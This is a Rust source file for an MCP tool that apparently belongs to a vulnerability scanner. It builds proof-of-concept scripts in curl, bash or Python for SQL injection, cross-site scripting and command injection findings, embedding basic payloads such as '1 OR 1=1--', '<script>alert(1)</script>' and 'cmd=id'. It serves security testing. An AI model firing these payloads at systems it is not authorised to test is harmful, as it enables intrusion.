use application::McpTool;
use async_trait::async_trait;

pub struct GeneratePocTool;

#[async_trait]
impl McpTool for GeneratePocTool {
    fn name(&self) -> &str {
        "generate_poc"
    }

    fn description(&self) -> &str {
        "Creates a standalone exploit PoC script derived from a finding's taint trace and metadata."
    }

    fn schema(&self) -> serde_json::Value {
        serde_json::json!({
            "type": "object",
            "properties": {
                "finding_id": { "type": "string" },
                "target_url": { "type": "string" },
                "cwe": { "type": "string" },
                "language": { "type": "string", "enum": ["python", "bash", "curl"] }
            },
            "required": ["finding_id", "cwe"]
        })
    }

    async fn execute(&self, params: serde_json::Value) -> anyhow::Result<serde_json::Value> {
        let cwe = params["cwe"].as_str().unwrap_or("CWE-0");
        let target_url = params["target_url"].as_str().unwrap_or("http://target");
        let language = params["language"].as_str().unwrap_or("python");

        let script = match cwe {
            "CWE-89" => self.sqli_poc(target_url, language),
            "CWE-79" => self.xss_poc(target_url, language),
            "CWE-78" => self.cmdi_poc(target_url, language),
            _ => format!("# PoC for {} against {}\n# Manual exploit required\n", cwe, target_url),
        };

        Ok(serde_json::json!({
            "cwe": cwe,
            "language": language,
            "script": script
        }))
    }
}

impl GeneratePocTool {
    fn sqli_poc(&self, url: &str, lang: &str) -> String {
        match lang {
            "curl" => format!("curl -s '{}?id=1 OR 1=1--'", url),
            "bash" => format!("#!/bin/bash\ncurl -s '{}?id=1 OR 1=1--'", url),
            _ => format!(
                "import requests\nr = requests.get('{}', params={{'id': \"1 OR 1=1--\"}})\nprint(r.text)",
                url
            ),
        }
    }

    fn xss_poc(&self, url: &str, lang: &str) -> String {
        match lang {
            "curl" => format!("curl -s '{}?q=<script>alert(1)</script>'", url),
            _ => format!(
                "import requests\nr = requests.get('{}', params={{'q': '<script>alert(1)</script>'}})\nprint(r.text)",
                url
            ),
        }
    }

    fn cmdi_poc(&self, url: &str, lang: &str) -> String {
        match lang {
            "curl" => format!("curl -s '{}?cmd=id'", url),
            _ => format!(
                "import requests\nr = requests.get('{}', params={{'cmd': 'id'}})\nprint(r.text)",
                url
            ),
        }
    }
}
